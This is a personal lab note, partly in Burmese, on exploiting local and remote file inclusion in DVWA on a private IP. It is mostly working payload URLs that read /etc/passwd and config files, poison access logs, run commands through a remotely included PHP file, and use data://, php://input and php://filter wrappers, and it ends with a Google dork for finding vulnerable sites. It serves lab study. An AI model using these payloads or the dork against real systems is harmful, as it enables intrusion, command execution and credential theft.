

http://192.168.99.116/DVWA/vulnerabilities/fi/?page=file1.php      => file.php   is vlun

http://192.168.99.116/DVWA/vulnerabilities/fi/?page=/etc/passwd     =>  /etc/passwd

Summary  => file htal ka file ko use htar lot

_____________________________________________________________________

RFI   => Remote File Inclusion    => more easy than LFI

http://192.168.99.116/DVWA/vulnerabilities/fi/?page=https://www.google.com/robots.txt  => google robot .txt

http://192.168.99.116/DVWA/vulnerabilities/fi/?page=http://192.168.99.116/rfi/rfi.txt  => with my local host

![[Pasted image 20230107230755.png]]


http://192.168.99.116/DVWA/vulnerabilities/fi/?page=http://192.168.99.116/rfi/rfi.txt&cmd=cat%20/etc/passwd    => exploit RFI with php system command

![[Pasted image 20230107231212.png]]

Here is exploit !

![[Pasted image 20230107231322.png]]


http://192.168.99.116/DVWA/vulnerabilities/fi/?page=http://192.168.99.116/rfi/rfi.txt&cmd=whoami;ls%20-al   => we can use two or three command concat with this    ";"


http://192.168.99.116/DVWA/vulnerabilities/fi/?page=Http://192.168.99.116/rfi/rfi.txt&cmd=whoami       => banned http  and ../ 


http://192.168.99.116/DVWA/vulnerabilities/fi/?page=file:///etc/passwd     => we use file///  potocol to know this vlun  / method are not allow / just allow for file 

http://192.168.99.116/DVWA/vulnerabilities/fi/?page=file:///var/log/apache2/access.log   => we use access.log that's mostly vlun in older version os  

=> we take another browser tab to enter the access log and then replace with melicious code like that!

![[Pasted image 20230108011348.png]]

_____________________________________________________________________

LFI    => Local File Inclusion

http://192.168.99.116/DVWA/vulnerabilities/fi/?page=/etc/passwd

LFI have normally 3 methods

1.  data://wrapper  =>  allow url include on

http://192.168.99.116/DVWA/vulnerabilities/fi/?page=data:,<?php phpinfo(); php?>

2.  data://wrapper with base 64 encode  => allow url include on
http://192.168.99.116/DVWA/vulnerabilities/fi/?page=data:;base64,PD9waHAgcGhwaW5mbygpOyAgPz4K    => i change base64 value to <?php phpinfo(); php?>

=> echo "<?php phpinfo();  ?>"  | base64       => change to base 64 encode   / decode is -d

3.  php:// method
  http://192.168.99.116/DVWA/vulnerabilities/fi/?page=php://input
![[Pasted image 20230108014132.png]]

and then we change in burp suite

![[Pasted image 20230108014213.png]]

Done!

4. php://filter    => just read for information
http://192.168.99.116/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php   => google it up

http://192.168.99.116/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/var/www/html/DVWA/config/config.inc.php    => use your brain


___________________________________________________________________________

Google Dock

inurl:"index.php?page=index.php"